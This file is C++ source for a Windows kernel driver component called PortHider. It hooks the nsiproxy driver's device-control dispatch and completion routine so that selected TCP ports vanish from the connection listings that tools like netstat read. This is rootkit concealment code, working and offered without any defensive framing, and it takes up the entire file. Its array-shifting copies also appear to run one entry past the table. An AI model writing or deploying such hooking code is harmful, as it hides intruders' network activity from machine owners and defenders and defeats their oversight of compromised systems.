#include "PortHider.h"

HiddenPortsVector* PortHider::m_hiddenPorts = nullptr;
PDRIVER_OBJECT PortHider::m_nsiDriver = nullptr;
PDRIVER_DISPATCH PortHider::m_nsiOriginalDispatch = nullptr;

PortHider::PortHider() {}

NTSTATUS PortHider::hide() {
	auto status = STATUS_SUCCESS;
	UNICODE_STRING nsiDriverName;

	RtlInitUnicodeString(&nsiDriverName, NSI_DRIVER_NAME);

	status = ObReferenceObjectByName(&nsiDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, reinterpret_cast<PVOID*>(&m_nsiDriver));

	if (!NT_SUCCESS(status)){
		return STATUS_SUCCESS;
	}

	m_hiddenPorts = new(PagedPool, POOL_TAG) HiddenPortsVector();
	//Initialize hidden ports context
	//HiddenPortsContext.Mutex.Init();
	//HiddenPortsContext.HiddenPortsCount = 0;
	//InitializeListHead(&HiddenPortsContext.HiddenPortsHead);

	//Save the original device control function of the nsiproxy driver
	m_nsiOriginalDispatch = m_nsiDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL];

	//Perform IRP hook
	InterlockedExchangePointer(reinterpret_cast<PVOID*>(&m_nsiDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL]), hookedDeviceIoControl);

	return status;
}

NTSTATUS PortHider::hookedDeviceIoControl(PDEVICE_OBJECT deviceObject, PIRP irp)
{
	auto status = STATUS_SUCCESS;
	const auto irpStack = IoGetCurrentIrpStackLocation(irp);

	const auto ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	if (IOCTL_NSI_GETALLPARAM == ioControlCode)
	{
		if (irpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
		{
			//If call is relevent, hook the CompletionRoutine.
			auto context = new(PagedPool, POOL_TAG) HP_CONTEXT;

			context->oldIocomplete = irpStack->CompletionRoutine;
			context->oldCtx = irpStack->Context;
			irpStack->CompletionRoutine = hookedCompletionRoutine;
			context->pcb = IoGetCurrentProcess();

			if ((irpStack->Control & SL_INVOKE_ON_SUCCESS) == SL_INVOKE_ON_SUCCESS) {
				context->bShouldInvolve = TRUE;
			}
			else {
				context->bShouldInvolve = FALSE;
			}
			
			irpStack->Context = context;
			irpStack->Control |= SL_INVOKE_ON_SUCCESS;
		}
	}

	//Call the original DeviceIoControl function.
	status = m_nsiOriginalDispatch(deviceObject, irp);

	return status;
}

NTSTATUS PortHider::hookedCompletionRoutine(PDEVICE_OBJECT deviceObject, PIRP irp, PVOID context)
{
	auto status = STATUS_SUCCESS;
	const auto nextIrpLocation = IoGetNextIrpStackLocation(irp);
	const auto requestContext = UniquePtr<HP_CONTEXT, PagedPool>(reinterpret_cast<PHP_CONTEXT>(context));

	if (NT_SUCCESS(irp->IoStatus.Status)){
		auto nsiParam = reinterpret_cast<PNSI_PARAM>(irp->UserBuffer);

		if (MmIsAddressValid(reinterpret_cast<PVOID>(nsiParam->lpMem))){
			// Netstat will involve internal calls which will use nsi_param structure.
			if (nsiParam->Protocol == TCP){
				KAPC_STATE apcState;
				auto statusEntry = reinterpret_cast<PNSI_STATUS_ENTRY>(nsiParam->lpStatus);
				auto tcpTableEntry = reinterpret_cast<PINTERNAL_TCP_TABLE_ENTRY>(reinterpret_cast<PVOID>(nsiParam->lpMem));
				auto connectionsCount = nsiParam->ConnectionCount;

				KeStackAttachProcess(requestContext->pcb, &apcState);

				//Make sure we are in the context of original process.
				for (auto connectionIndex = 0; connectionIndex < connectionsCount; connectionIndex++){
					if (shouldHidePort(tcpTableEntry[connectionIndex].localEntry.Port)){
						//NSI will map status array entry to tcp table array entry, we must modify both synchronously.
						RtlCopyMemory(&tcpTableEntry[connectionIndex], &tcpTableEntry[connectionIndex + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (connectionsCount - connectionIndex));
						RtlCopyMemory(&statusEntry[connectionIndex], &statusEntry[connectionIndex + 1], sizeof(NSI_STATUS_ENTRY) * (connectionsCount - connectionIndex));
						connectionsCount--;
						nsiParam->ConnectionCount--;
						connectionIndex--;
					}
				}
				KeUnstackDetachProcess(&apcState);
			}
		}
	}

	nextIrpLocation->Context = requestContext->oldCtx;
	nextIrpLocation->CompletionRoutine = requestContext->oldIocomplete;

	if (requestContext->bShouldInvolve){
		status = nextIrpLocation->CompletionRoutine(deviceObject, irp, context);
	}

	else if (irp->PendingReturned){
		IoMarkIrpPending(irp);
	}

	return status;
}

NTSTATUS PortHider::unhide() {
	InterlockedExchangePointer(reinterpret_cast<PVOID*>(&m_nsiDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL]), m_nsiOriginalDispatch);

	//Decrease reference count of hooked driver
	ObDereferenceObject(m_nsiDriver);

	delete m_hiddenPorts;

	return STATUS_SUCCESS;
}

bool PortHider::shouldHidePort(USHORT port) {
	for (auto i = 0UL; i < m_hiddenPorts->size(); i++){
		if ((*m_hiddenPorts)[i] == port){
			return true;
		}
	}

	return false;
}

void PortHider::addHiddenPort(USHORT port) {
	m_hiddenPorts->push_back(htons(port));
}

USHORT PortHider::htons(USHORT a){
	USHORT b = a;
	b = (b << 8);
	a = (a >> 8);
	return (a | b);
}
